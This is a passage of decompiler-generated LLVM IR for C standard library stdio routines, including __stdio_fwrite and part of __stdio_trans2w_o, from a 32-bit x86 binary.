  %v0_8055c0d.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055c00

dec_label_pc_8055c22:                             ; preds = %dec_label_pc_8055c00
  %v0_8055c22 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055c22 = inttoptr i32 %v0_8055c22 to i32*
  %v2_8055c22 = load i32, i32* %v1_8055c22, align 4
  store i32 %v2_8055c22, i32* %eax.global-to-local, align 4
  %v1_8055c25 = add i32 %v0_8055c22, 8
  %v2_8055c25 = inttoptr i32 %v1_8055c25 to i32*
  %v3_8055c25 = load i32, i32* %v2_8055c25, align 4
  store i32 %v3_8055c25, i32* @edx, align 4
  %v1_8055c28 = or i32 %v2_8055c22, 8
  store i32 %v1_8055c28, i32* %eax.global-to-local, align 4
  %v1_8055c2b = trunc i32 %v1_8055c28 to i16
  %v3_8055c2b = inttoptr i32 %v0_8055c22 to i16*
  store i16 %v1_8055c2b, i16* %v3_8055c2b, align 2
  %v0_8055c2f = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055c2f = add i32 %v0_8055c2f, 12
  %v2_8055c2f = inttoptr i32 %v1_8055c2f to i32*
  %v3_8055c2f = load i32, i32* %v2_8055c2f, align 4
  %v1_8055c32 = load i32, i32* @edx, align 4
  %v2_8055c32 = sub i32 %v3_8055c2f, %v1_8055c32
  %v12_8055c32 = icmp eq i32 %v2_8055c32, 0
  store i1 %v12_8055c32, i1* %zf.global-to-local, align 1
  store i32 %v2_8055c32, i32* %eax.global-to-local, align 4
  %v4_8055c58.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8055c32, label %dec_label_pc_8055c58, label %dec_label_pc_8055c36

dec_label_pc_8055c36:                             ; preds = %dec_label_pc_8055c22
  %v12_8055c36 = icmp eq i32 %v2_8055c32, %v4_8055c58.pre
  store i1 %v12_8055c36, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_8055c32, %v4_8055c58.pre
  %v3_8055c38 = load i32, i32* %esi.global-to-local, align 4
  %v5_8055c38 = select i1 %tmp, i32 %v2_8055c32, i32 %v3_8055c38
  store i32 %v5_8055c38, i32* %esi.global-to-local, align 4
  %v0_8055c3b.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8055c3b

dec_label_pc_8055c3b:                             ; preds = %dec_label_pc_8055c4d, %dec_label_pc_8055c36
  %v2_8055c3f = phi i32 [ %v1_8055c49, %dec_label_pc_8055c4d ], [ %v1_8055c32, %dec_label_pc_8055c36 ]
  %v4_8055c3b = phi i32 [ %v4_8055c3b.pre, %dec_label_pc_8055c4d ], [ %v2_8055c32, %dec_label_pc_8055c36 ]
  %v0_8055c3b = phi i32 [ %v1_8055c4d, %dec_label_pc_8055c4d ], [ %v0_8055c3b.pre, %dec_label_pc_8055c36 ]
  %v1_8055c3b = inttoptr i32 %v0_8055c3b to i8*
  %v2_8055c3b = load i8, i8* %v1_8055c3b, align 1
  %v3_8055c3b = zext i8 %v2_8055c3b to i32
  %v5_8055c3b = and i32 %v4_8055c3b, -256
  %v6_8055c3b = or i32 %v3_8055c3b, %v5_8055c3b
  store i32 %v6_8055c3b, i32* %eax.global-to-local, align 4
  %v10_8055c3d = icmp eq i8 %v2_8055c3b, 10
  store i1 %v10_8055c3d, i1* %zf.global-to-local, align 1
  %v3_8055c3f = inttoptr i32 %v2_8055c3f to i8*
  store i8 %v2_8055c3b, i8* %v3_8055c3f, align 1
  %v0_8055c41 = load i1, i1* %zf.global-to-local, align 1
  %v1_8055c41 = icmp eq i1 %v0_8055c41, false
  br i1 %v1_8055c41, label %dec_label_pc_8055c49, label %dec_label_pc_8055c43

dec_label_pc_8055c43:                             ; preds = %dec_label_pc_8055c3b
  %v0_8055c43 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055c43 = add i32 %v0_8055c43, 1
  %v2_8055c43 = inttoptr i32 %v1_8055c43 to i8*
  %v3_8055c43 = load i8, i8* %v2_8055c43, align 1
  %v4_8055c43 = urem i8 %v3_8055c43, 2
  %v5_8055c43 = icmp eq i8 %v4_8055c43, 0
  store i1 %v5_8055c43, i1* %zf.global-to-local, align 1
  %v1_8055c47 = icmp eq i1 %v5_8055c43, false
  br i1 %v1_8055c47, label %dec_label_pc_8055c43.dec_label_pc_8055c50_crit_edge, label %dec_label_pc_8055c49

dec_label_pc_8055c43.dec_label_pc_8055c50_crit_edge: ; preds = %dec_label_pc_8055c43
  %v0_8055c50.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055c50

dec_label_pc_8055c49:                             ; preds = %dec_label_pc_8055c43, %dec_label_pc_8055c3b
  %v0_8055c49 = load i32, i32* @edx, align 4
  %v1_8055c49 = add i32 %v0_8055c49, 1
  store i32 %v1_8055c49, i32* @edx, align 4
  %v0_8055c4a = load i32, i32* %esi.global-to-local, align 4
  %v1_8055c4a = add i32 %v0_8055c4a, -1
  %v8_8055c4a = icmp eq i32 %v1_8055c4a, 0
  store i1 %v8_8055c4a, i1* %zf.global-to-local, align 1
  store i32 %v1_8055c4a, i32* %esi.global-to-local, align 4
  br i1 %v8_8055c4a, label %dec_label_pc_8055c49.dec_label_pc_8055c50_crit_edge, label %dec_label_pc_8055c4d

dec_label_pc_8055c49.dec_label_pc_8055c50_crit_edge: ; preds = %dec_label_pc_8055c49
  %v1_8055c50.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055c50

dec_label_pc_8055c4d:                             ; preds = %dec_label_pc_8055c49
  %v0_8055c4d = load i32, i32* @edi, align 4
  %v1_8055c4d = add i32 %v0_8055c4d, 1
  %v8_8055c4d = icmp eq i32 %v1_8055c4d, 0
  store i1 %v8_8055c4d, i1* %zf.global-to-local, align 1
  store i32 %v1_8055c4d, i32* @edi, align 4
  %v4_8055c3b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055c3b

dec_label_pc_8055c50:                             ; preds = %dec_label_pc_8055c49.dec_label_pc_8055c50_crit_edge, %dec_label_pc_8055c43.dec_label_pc_8055c50_crit_edge
  %v1_8055c50 = phi i32 [ %v0_8055c43, %dec_label_pc_8055c43.dec_label_pc_8055c50_crit_edge ], [ %v1_8055c50.pre, %dec_label_pc_8055c49.dec_label_pc_8055c50_crit_edge ]
  %v0_8055c50 = phi i32 [ %v0_8055c50.pre, %dec_label_pc_8055c43.dec_label_pc_8055c50_crit_edge ], [ %v1_8055c49, %dec_label_pc_8055c49.dec_label_pc_8055c50_crit_edge ]
  %v2_8055c50 = add i32 %v1_8055c50, 16
  %v3_8055c50 = inttoptr i32 %v2_8055c50 to i32*
  store i32 %v0_8055c50, i32* %v3_8055c50, align 4
  %v0_8055c53 = load i32, i32* @edx, align 4
  %v1_8055c53 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055c53 = add i32 %v1_8055c53, 8
  %v3_8055c53 = inttoptr i32 %v2_8055c53 to i32*
  %v4_8055c53 = load i32, i32* %v3_8055c53, align 4
  %v5_8055c53 = sub i32 %v0_8055c53, %v4_8055c53
  store i32 %v5_8055c53, i32* @edx, align 4
  %v0_8055c56 = load i32, i32* @ebx, align 4
  %v2_8055c56 = sub i32 %v0_8055c56, %v5_8055c53
  %v12_8055c56 = icmp eq i32 %v2_8055c56, 0
  store i1 %v12_8055c56, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8055c58

dec_label_pc_8055c58:                             ; preds = %dec_label_pc_8055c22, %dec_label_pc_8055c50
  %v4_8055c58 = phi i32 [ %v2_8055c56, %dec_label_pc_8055c50 ], [ %v4_8055c58.pre, %dec_label_pc_8055c22 ]
  %v5_8055c58 = sub i32 %arg3, %v4_8055c58
  %v15_8055c58 = icmp eq i32 %v5_8055c58, 0
  store i1 %v15_8055c58, i1* %zf.global-to-local, align 1
  %v0_8055c60.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055c5c

dec_label_pc_8055c5c:                             ; preds = %dec_label_pc_8055c1c, %entry, %dec_label_pc_8055c58
  %v0_8055c60 = phi i32 [ %v0_8055c60.pre, %dec_label_pc_8055c58 ], [ %v15_8055bec, %entry ], [ %v15_8055bec, %dec_label_pc_8055c1c ]
  %stack_var_12.0 = phi i32 [ %v5_8055c58, %dec_label_pc_8055c58 ], [ 0, %entry ], [ %arg3, %dec_label_pc_8055c1c ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8055c60 = icmp eq i32 %v0_8055c60, -12
  store i1 %v9_8055c60, i1* %zf.global-to-local, align 1
  store i32 %v0_8055beb, i32* @ebx, align 4
  store i32 %v0_8055be9, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8055c4d, { 1, 2, 0 }
  uselistorder i32 %v1_8055c4a, { 1, 0 }
  uselistorder i32 %v1_8055c49, { 0, 2, 1 }
  uselistorder i8 %v2_8055c3b, { 1, 0, 2 }
  uselistorder i32 %v4_8055c58.pre, { 2, 0, 1 }
  uselistorder i32 %v2_8055c32, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_8055c1e, { 1, 0 }
  uselistorder i32 %v2_8055c1c, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8055c10, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 4, 5, 0, 6 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_8055c5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055c58, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055c68 = load i32, i32* @ebp, align 4
  %v0_8055c69 = load i32, i32* @edi, align 4
  %v0_8055c6a = load i32, i32* @esi, align 4
  %v0_8055c6b = load i32, i32* @ebx, align 4
  store i32 %v0_8055c6b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8055c7b = add i32 %arg3, 1
  %v2_8055c7b = inttoptr i32 %v1_8055c7b to i8*
  %v3_8055c7b = load i8, i8* %v2_8055c7b, align 1
  %v4_8055c7b = and i8 %v3_8055c7b, 2
  %v5_8055c7b = icmp eq i8 %v4_8055c7b, 0
  %v1_8055c7f = icmp eq i1 %v5_8055c7b, false
  br i1 %v1_8055c7f, label %dec_label_pc_8055d30, label %dec_label_pc_8055c85

dec_label_pc_8055c85:                             ; preds = %entry
  %v1_8055c85 = add i32 %arg3, 4
  %v2_8055c85 = inttoptr i32 %v1_8055c85 to i32*
  %v3_8055c85 = load i32, i32* %v2_8055c85, align 4
  %v13_8055c85 = icmp eq i32 %v3_8055c85, -2
  %v1_8055c89 = add i32 %arg3, 16
  %v2_8055c89 = inttoptr i32 %v1_8055c89 to i32*
  %v3_8055c89 = load i32, i32* %v2_8055c89, align 4
  store i32 %v3_8055c89, i32* @edx, align 4
  %v1_8055c8c = add i32 %arg3, 12
  %v2_8055c8c = inttoptr i32 %v1_8055c8c to i32*
  %v3_8055c8c = load i32, i32* %v2_8055c8c, align 4
  store i32 %v3_8055c8c, i32* %eax.global-to-local, align 4
  %v1_8055c8f = icmp eq i1 %v13_8055c85, false
  %v2_8055cae = sub i32 %v3_8055c8c, %v3_8055c89
  br i1 %v1_8055c8f, label %dec_label_pc_8055cae, label %dec_label_pc_8055c91

dec_label_pc_8055c91:                             ; preds = %dec_label_pc_8055c85
  %tmp = icmp uge i32 %v2_8055cae, %arg2
  %v5_8055c98 = select i1 %tmp, i32 %arg2, i32 %v2_8055cae
  store i32 %v5_8055c98, i32* %ebx.global-to-local, align 4
  %v3_8055c9e = inttoptr i32 %v3_8055c89 to i16*
  %v4_8055c9e = call i32 @memcpy(i16* %v3_8055c9e, i32 %v5_8055c98, i32 %v3_8055c8c)
  store i32 %v4_8055c9e, i32* %eax.global-to-local, align 4
  %v0_8055ca6 = load i32, i32* @esi, align 4
  %v1_8055ca6 = add i32 %v0_8055ca6, 16
  %v2_8055ca6 = inttoptr i32 %v1_8055ca6 to i32*
  %v3_8055ca6 = load i32, i32* %v2_8055ca6, align 4
  %v4_8055ca6 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8055ca6 = add i32 %v4_8055ca6, %v3_8055ca6
  store i32 %v5_8055ca6, i32* %v2_8055ca6, align 4
  br label %dec_label_pc_8055d48

dec_label_pc_8055cae:                             ; preds = %dec_label_pc_8055c85
  store i32 %v2_8055cae, i32* %eax.global-to-local, align 4
  %v6_8055cb2 = icmp ult i32 %v2_8055cae, %arg2
  br i1 %v6_8055cb2, label %dec_label_pc_8055d17, label %dec_label_pc_8055cb4

dec_label_pc_8055cb4:                             ; preds = %dec_label_pc_8055cae
  %v0_8055cb4 = load i32, i32* @ecx, align 4
  %v3_8055cb8 = inttoptr i32 %v3_8055c89 to i16*
  %v4_8055cb8 = call i32 @memcpy(i16* %v3_8055cb8, i32 %arg2, i32 %v0_8055cb4)
  store i32 %v4_8055cb8, i32* %eax.global-to-local, align 4
  %v0_8055cc0 = load i32, i32* @esi, align 4
  %v1_8055cc0 = add i32 %v0_8055cc0, 16
  %v2_8055cc0 = inttoptr i32 %v1_8055cc0 to i32*
  %v3_8055cc0 = load i32, i32* %v2_8055cc0, align 4
  %v4_8055cc0 = load i32, i32* @edi, align 4
  %v5_8055cc0 = add i32 %v4_8055cc0, %v3_8055cc0
  store i32 %v5_8055cc0, i32* %v2_8055cc0, align 4
  %v0_8055cc3 = load i32, i32* @esi, align 4
  %v1_8055cc3 = add i32 %v0_8055cc3, 1
  %v2_8055cc3 = inttoptr i32 %v1_8055cc3 to i8*
  %v3_8055cc3 = load i8, i8* %v2_8055cc3, align 1
  %v4_8055cc3 = urem i8 %v3_8055cc3, 2
  %v5_8055cc3 = icmp eq i8 %v4_8055cc3, 0
  br i1 %v5_8055cc3, label %dec_label_pc_8055d48, label %dec_label_pc_8055cc9

dec_label_pc_8055cc9:                             ; preds = %dec_label_pc_8055cb4
  %v0_8055cc9 = load i32, i32* @edx, align 4
  %v0_8055cca = load i32, i32* @edi, align 4
  %v4_8055cce = call i32 @memrchr(i8 10, i32 %v0_8055cca, i32 %v0_8055cc9)
  store i32 %v4_8055cce, i32* %eax.global-to-local, align 4
  %v1_8055cd6 = icmp eq i32 %v4_8055cce, 0
  br i1 %v1_8055cd6, label %dec_label_pc_8055d48, label %dec_label_pc_8055cda

dec_label_pc_8055cda:                             ; preds = %dec_label_pc_8055cc9
  %v0_8055cdd = load i32, i32* @esi, align 4
  %v1_8055cde = call i32 @__stdio_wcommit(i32 %v0_8055cdd)
  store i32 %v1_8055cde, i32* %eax.global-to-local, align 4
  %v1_8055ce6 = icmp eq i32 %v1_8055cde, 0
  br i1 %v1_8055ce6, label %dec_label_pc_8055d48, label %dec_label_pc_8055cea

dec_label_pc_8055cea:                             ; preds = %dec_label_pc_8055cda
  %v0_8055cea = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_8055cea, %v1_8055cde
  %v5_8055cee = select i1 %tmp20, i32 %v0_8055cea, i32 %v1_8055cde
  store i32 %v5_8055cee, i32* %ebx.global-to-local, align 4
  %v2_8055cf3 = sub i32 %v0_8055cea, %v5_8055cee
  store i32 %v2_8055cf3, i32* %eax.global-to-local, align 4
  %v0_8055cf5 = load i32, i32* @ebp, align 4
  %v2_8055cf5 = add i32 %v0_8055cf5, %v2_8055cf3
  store i32 %v2_8055cf5, i32* %ebp.global-to-local, align 4
  %v4_8055cfc = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_8055cee, i32 %v2_8055cf3)
  store i32 %v4_8055cfc, i32* %eax.global-to-local, align 4
  %v1_8055d04 = icmp eq i32 %v4_8055cfc, 0
  store i32 %v4_8055cfc, i32* @edx, align 4
  br i1 %v1_8055d04, label %dec_label_pc_8055d48, label %dec_label_pc_8055d0a

dec_label_pc_8055d0a:                             ; preds = %dec_label_pc_8055cea
  %v0_8055d0a = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055d0a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055d0a = sub i32 %v0_8055d0a, %v4_8055cfc
  %v2_8055d0e = add i32 %v2_8055d0a, %v1_8055d0a
  store i32 %v2_8055d0e, i32* %eax.global-to-local, align 4
  %v0_8055d10 = load i32, i32* @esi, align 4
  %v1_8055d10 = add i32 %v0_8055d10, 16
  %v2_8055d10 = inttoptr i32 %v1_8055d10 to i32*
  %v3_8055d10 = load i32, i32* %v2_8055d10, align 4
  %v5_8055d10 = sub i32 %v3_8055d10, %v2_8055d0e
  store i32 %v5_8055d10, i32* %v2_8055d10, align 4
  %v0_8055d13 = load i32, i32* @edi, align 4
  %v1_8055d13 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055d13 = sub i32 %v0_8055d13, %v1_8055d13
  store i32 %v2_8055d13, i32* @edi, align 4
  br label %dec_label_pc_8055d48

dec_label_pc_8055d17:                             ; preds = %dec_label_pc_8055cae
  %v2_8055d17 = add i32 %arg3, 8
  %v3_8055d17 = inttoptr i32 %v2_8055d17 to i32*
  %v4_8055d17 = load i32, i32* %v3_8055d17, align 4
  %v15_8055d17 = icmp eq i32 %v3_8055c89, %v4_8055d17
  br i1 %v15_8055d17, label %dec_label_pc_8055d30, label %dec_label_pc_8055d1c

dec_label_pc_8055d1c:                             ; preds = %dec_label_pc_8055d17
  %v1_8055d20 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8055d20, i32* %eax.global-to-local, align 4
  %v1_8055d28 = icmp eq i32 %v1_8055d20, 0
  br i1 %v1_8055d28, label %dec_label_pc_8055d1c.dec_label_pc_8055d30_crit_edge, label %dec_label_pc_8055d2c

dec_label_pc_8055d1c.dec_label_pc_8055d30_crit_edge: ; preds = %dec_label_pc_8055d1c
  %v0_8055d30.pre = load i32, i32* @edi, align 4
  %v0_8055d38.pre = load i32, i32* @esi, align 4
  %v2_8055d3f.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8055d30

dec_label_pc_8055d2c:                             ; preds = %dec_label_pc_8055d1c
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8055d48

dec_label_pc_8055d30:                             ; preds = %dec_label_pc_8055d1c.dec_label_pc_8055d30_crit_edge, %dec_label_pc_8055d17, %entry
  %v2_8055d3f = phi i32 [ %v2_8055d3f.pre, %dec_label_pc_8055d1c.dec_label_pc_8055d30_crit_edge ], [ %v0_8055c6b, %dec_label_pc_8055d17 ], [ %v0_8055c6b, %entry ]
  %v0_8055d38 = phi i32 [ %v0_8055d38.pre, %dec_label_pc_8055d1c.dec_label_pc_8055d30_crit_edge ], [ %arg3, %dec_label_pc_8055d17 ], [ %arg3, %entry ]
  %v0_8055d30 = phi i32 [ %v0_8055d30.pre, %dec_label_pc_8055d1c.dec_label_pc_8055d30_crit_edge ], [ %arg2, %dec_label_pc_8055d17 ], [ %arg2, %entry ]
  store i32 %v2_8055d3f, i32* @ebx, align 4
  store i32 %v0_8055c69, i32* @edi, align 4
  %v4_8055d43 = inttoptr i32 %v0_8055d38 to i16*
  %v5_8055d43 = call i32 @__stdio_WRITE(i16* %v4_8055d43, i32 %v0_8055d30, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055d43, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055d48

dec_label_pc_8055d48:                             ; preds = %dec_label_pc_8055cea, %dec_label_pc_8055cda, %dec_label_pc_8055cc9, %dec_label_pc_8055cb4, %dec_label_pc_8055d2c, %dec_label_pc_8055d0a, %dec_label_pc_8055c91, %dec_label_pc_8055d30
  %v0_8055d4b = load i32, i32* @edi, align 4
  store i32 %v0_8055d4b, i32* %eax.global-to-local, align 4
  %v2_8055d4d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055d4d, i32* @ebx, align 4
  store i32 %v0_8055c6a, i32* @esi, align 4
  store i32 %v0_8055c69, i32* @edi, align 4
  store i32 %v0_8055c68, i32* @ebp, align 4
  ret i32 %v0_8055d4b

; uselistorder directives
  uselistorder i32 %v2_8055d0e, { 1, 0 }
  uselistorder i32 %v0_8055cea, { 2, 1, 0 }
  uselistorder i32 %v1_8055cde, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8055cae, { 2, 3, 1, 0 }
  uselistorder i32 %v3_8055c89, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_8055c69, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8055d48, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055d54 = load i32, i32* @ebx, align 4
  %v4_8055d58 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8055d58, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8055d60 = load i16, i16* %arg1, align 2
  %v3_8055d60 = zext i16 %v2_8055d60 to i32
  store i32 %v3_8055d60, i32* %eax.global-to-local, align 4
  %v2_8055d63 = and i32 %v3_8055d60, %arg2
  %v3_8055d63 = icmp eq i32 %v2_8055d63, 0
  %v1_8055d65 = icmp eq i1 %v3_8055d63, false
  br i1 %v1_8055d65, label %dec_label_pc_8055d73, label %dec_label_pc_8055d67

dec_label_pc_8055d67:                             ; preds = %entry
  %v1_8055d67 = and i32 %v3_8055d60, 2176
  %v2_8055d67 = icmp eq i32 %v1_8055d67, 0
  %v1_8055d6c = icmp eq i1 %v2_8055d67, false
  br i1 %v1_8055d6c, label %dec_label_pc_8055d7b, label %dec_label_pc_8055d6e

dec_label_pc_8055d6e:                             ; preds = %dec_label_pc_8055d67
  %v2_8055d6e = or i32 %v3_8055d60, %arg2
  store i32 %v2_8055d6e, i32* %eax.global-to-local, align 4
  %v1_8055d70 = trunc i32 %v2_8055d6e to i16
  store i16 %v1_8055d70, i16* %arg1, align 2
  %v0_8055d73.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055d73

dec_label_pc_8055d73:                             ; preds = %entry, %dec_label_pc_8055d6e
  %v0_8055dbc = phi i32 [ %v4_8055d58, %entry ], [ %v0_8055d73.pre, %dec_label_pc_8055d6e ]
  %v1_8055d73 = inttoptr i32 %v0_8055dbc to i16*
  %v2_8055d73 = load i16, i16* %v1_8055d73, align 2
  %v3_8055d73 = zext i16 %v2_8055d73 to i32
  store i32 %v3_8055d73, i32* %edx.global-to-local, align 4
  %v2_8055d76 = and i16 %v2_8055d73, 32
  %v3_8055d76 = icmp eq i16 %v2_8055d76, 0
  br i1 %v3_8055d76, label %dec_label_pc_8055d93, label %dec_label_pc_8055d7b

dec_label_pc_8055d7b:                             ; preds = %dec_label_pc_8055d73, %dec_label_pc_8055d67
  %v1_8055d7b = call i32 @__errno_location(i32 %v0_8055d54)
  store i32 %v1_8055d7b, i32* %eax.global-to-local, align 4
  %v1_8055d80 = inttoptr i32 %v1_8055d7b to i32*
  store i32 9, i32* %v1_8055d80, align 4
  br label %dec_label_pc_8055d86

dec_label_pc_8055d86:                             ; preds = %dec_label_pc_8055daa, %dec_label_pc_8055d7b
  %v0_8055d86 = load i32, i32* @ebx, align 4
  %v1_8055d86 = inttoptr i32 %v0_8055d86 to i32*
  %v2_8055d86 = load i32, i32* %v1_8055d86, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8055d8b = or i32 %v2_8055d86, 8
  store i32 %v1_8055d8b, i32* %eax.global-to-local, align 4
  %v1_8055d8e = trunc i32 %v1_8055d8b to i16
  %v3_8055d8e = inttoptr i32 %v0_8055d86 to i16*
  store i16 %v1_8055d8e, i16* %v3_8055d8e, align 2
  br label %dec_label_pc_8055df5

dec_label_pc_8055d93:                             ; preds = %dec_label_pc_8055d73
  %v2_8055d93 = urem i16 %v2_8055d73, 4
  %v3_8055d93 = icmp eq i16 %v2_8055d93, 0
  br i1 %v3_8055d93, label %dec_label_pc_8055ddd, label %dec_label_pc_8055d98

dec_label_pc_8055d98:                             ; preds = %dec_label_pc_8055d93
  %v2_8055d98 = and i32 %v3_8055d73, 4
  %v3_8055d98 = icmp eq i32 %v2_8055d98, 0
  %v1_8055d9b = icmp eq i1 %v3_8055d98, false
  br i1 %v1_8055d9b, label %dec_label_pc_8055dc9, label %dec_label_pc_8055d9d

dec_label_pc_8055d9d:                             ; preds = %dec_label_pc_8055d98
  %v1_8055d9d = add i32 %v0_8055dbc, 20
  %v2_8055d9d = inttoptr i32 %v1_8055d9d to i32*
  %v3_8055d9d = load i32, i32* %v2_8055d9d, align 4
  store i32 %v3_8055d9d, i32* %eax.global-to-local, align 4
  %v2_8055da0 = add i32 %v0_8055dbc, 16
  %v3_8055da0 = inttoptr i32 %v2_8055da0 to i32*
  %v4_8055da0 = load i32, i32* %v3_8055da0, align 4
  %v15_8055da0 = icmp eq i32 %v3_8055d9d, %v4_8055da0
  %v1_8055da3 = icmp eq i1 %v15_8055da0, false
  br i1 %v1_8055da3, label %dec_label_pc_8055daa, label %dec_label_pc_8055da5

dec_label_pc_8055da5:                             ; preds = %dec_label_pc_8055d9d
  %v2_8055da5 = and i32 %v3_8055d73, 2
  %v3_8055da5 = icmp eq i32 %v2_8055da5, 0
  br i1 %v3_8055da5, label %dec_label_pc_8055dc9, label %dec_label_pc_8055daa

dec_label_pc_8055daa:                             ; preds = %dec_label_pc_8055da5, %dec_label_pc_8055d9d
  %v1_8055daa = and i32 %v3_8055d73, 1024
  store i32 %v1_8055daa, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_8055daa, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_8055dbd = call i32 @__GI_fseek(i32 %v0_8055dbc, i32 0, i32 %tmp17, i32 %v1_8055daa)
  store i32 %v5_8055dbd, i32* %eax.global-to-local, align 4
  %v1_8055dc5 = icmp eq i32 %v5_8055dbd, 0
  %v1_8055dc7 = icmp eq i1 %v1_8055dc5, false
  br i1 %v1_8055dc7, label %dec_label_pc_8055d86, label %dec_label_pc_8055daa.dec_label_pc_8055dc9_crit_edge

dec_label_pc_8055daa.dec_label_pc_8055dc9_crit_edge: ; preds = %dec_label_pc_8055daa
  %v0_8055dc9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055dc9

dec_label_pc_8055dc9:                             ; preds = %dec_label_pc_8055daa.dec_label_pc_8055dc9_crit_edge, %dec_label_pc_8055da5, %dec_label_pc_8055d98
  %v2_8055dce = phi i32 [ %v0_8055dc9.pre, %dec_label_pc_8055daa.dec_label_pc_8055dc9_crit_edge ], [ %v0_8055dbc, %dec_label_pc_8055da5 ], [ %v0_8055dbc, %dec_label_pc_8055d98 ]
  %v1_8055dc9 = inttoptr i32 %v2_8055dce to i32*
  %v2_8055dc9 = load i32, i32* %v1_8055dc9, align 4
  %v1_8055dcb = and i32 %v2_8055dc9, -4
  store i32 %v1_8055dcb, i32* %eax.global-to-local, align 4
  %v1_8055dce = trunc i32 %v1_8055dcb to i16
  %v3_8055dce = inttoptr i32 %v2_8055dce to i16*
  store i16 %v1_8055dce, i16* %v3_8055dce, align 2
  %v0_8055dd1 = load i32, i32* @ebx, align 4
  %v1_8055dd1 = add i32 %v0_8055dd1, 8
  %v2_8055dd1 = inttoptr i32 %v1_8055dd1 to i32*
  %v3_8055dd1 = load i32, i32* %v2_8055dd1, align 4
  store i32 %v3_8055dd1, i32* %eax.global-to-local, align 4
  %v2_8055dd4 = add i32 %v0_8055dd1, 24
  %v3_8055dd4 = inttoptr i32 %v2_8055dd4 to i32*
  store i32 %v3_8055dd1, i32* %v3_8055dd4, align 4
  %v0_8055dd7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055dd7 = load i32, i32* @ebx, align 4
  %v2_8055dd7 = add i32 %v1_8055dd7, 16
  %v3_8055dd7 = inttoptr i32 %v2_8055dd7 to i32*
  store i32 %v0_8055dd7, i32* %v3_8055dd7, align 4
  %v0_8055dda = load i32, i32* %eax.global-to-local, align 4
  %v1_8055dda = load i32, i32* @ebx, align 4
  %v2_8055dda = add i32 %v1_8055dda, 20
  %v3_8055dda = inttoptr i32 %v2_8055dda to i32*
  store i32 %v0_8055dda, i32* %v3_8055dda, align 4
  %v0_8055ddd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055ddd

dec_label_pc_8055ddd:                             ; preds = %dec_label_pc_8055d93, %dec_label_pc_8055dc9
  %v2_8055de4 = phi i32 [ %v0_8055dbc, %dec_label_pc_8055d93 ], [ %v0_8055ddd.pre, %dec_label_pc_8055dc9 ]
  %v1_8055ddd = inttoptr i32 %v2_8055de4 to i32*
  %v2_8055ddd = load i32, i32* %v1_8055ddd, align 4
  store i32 0, i32* %edx.global-to-local, align 4
